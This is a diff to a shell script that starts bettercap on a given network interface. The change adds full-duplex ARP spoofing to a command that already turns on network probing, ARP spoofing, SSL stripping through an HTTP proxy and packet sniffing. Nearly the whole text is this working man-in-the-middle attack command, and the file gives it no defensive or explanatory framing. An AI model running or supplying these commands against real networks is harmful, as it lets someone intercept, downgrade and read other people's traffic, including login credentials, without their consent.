@@ -29,4 +29,4 @@ echo
 sleep 3
 #netdiscover -i $1
 bettercap -iface $1 -eval "net.probe on; ticker on "
-bettercap -iface $1 -eval "net.probe on; set http.proxy.sslstrip true; set arp.spoof.internal true; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on ; "
+bettercap -iface $1 -eval "net.probe on; set http.proxy.sslstrip true; set arp.spoof.internal true; set arp.spoof.targets; arp.spoof.fullduplex true; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on ; "
